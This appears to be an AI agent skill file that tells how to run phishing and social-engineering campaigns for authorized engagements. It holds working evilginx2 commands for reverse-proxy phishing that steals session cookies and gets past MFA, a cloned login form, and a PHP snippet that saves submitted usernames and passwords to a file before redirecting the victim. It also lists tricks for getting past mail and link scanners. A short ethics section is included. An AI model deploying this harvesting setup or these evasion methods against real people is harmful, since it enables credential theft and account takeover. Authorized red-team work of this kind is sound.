---
name: phishing-and-social-engineering-campaigns
description: "Phishing and social engineering campaigns: pretext design, infrastructure setup, payload delivery, and measuring results. Use this skill for authorized social engineering engagements."
---

# Phishing Campaigns

## Overview

A campaign is: pretext → infrastructure → delivery → landing → capture → report. Authorization and scope are mandatory.

## Pretext design

Pick by goal:

| Goal | Pretext |
|---|---|
| Credentials | IT password expiry notice |
| Malware execution | invoice / shipping document |
| MFA bypass | fake login with a real-time proxy (evilginx) |
| Physical access | vendor / delivery |

Rules: match the target's language and tools, keep it short, one call to action.

## Infrastructure

```bash
# domain
# register a lookalike (typosquat), set SPF/DKIM/DMARC
# mail server
# postfix or a SaaS (SendGrid, Mailgun)
# landing page
# clone the target's login with evilginx or a simple PHP form
```

```bash
# evilginx2 (reverse proxy phishing, captures session cookies)
evilginx2 -p phishlets/
config domain example.com
phishlets hostname o365 login.example.com
phishlets enable o365
lures create o365
lures get-url 0
```

Evilginx defeats MFA by proxying the real login and stealing the session cookie.

## Delivery

- SMTP with a warmed domain (new domains are blocked).
- HTML attachment with a link (avoids link scanners).
- QR codes in PDFs (bypasses URL scanning).
- Calendar invites.

## Landing page

```html
<form method="POST" action="/collect.php">
  <input name="user"><input name="pass" type="password">
</form>
```

```php
<?php file_put_contents("creds.txt", $_POST['user'].":".$_POST['pass']."\n", FILE_APPEND); header("Location: https://real-site"); ?>
```

## Measurement

- Click rate, credential capture rate, report rate.
- Time to first click.
- Which pretext performed best.

## Ethics and scope

- Only the authorized target list.
- No real credentials stored beyond the engagement.
- Debrief every participant.
- Never target personal accounts outside scope.

## Pitfalls

- SPF/DKIM/DMARC misconfiguration lands everything in spam.
- Link scanners (Defender Safe Links) pre-fetch and burn the lure.
- Real credential capture requires secure handling — encrypt at rest.

## Verification

Campaign results must be measurable and reported with the infrastructure cleaned up afterward.
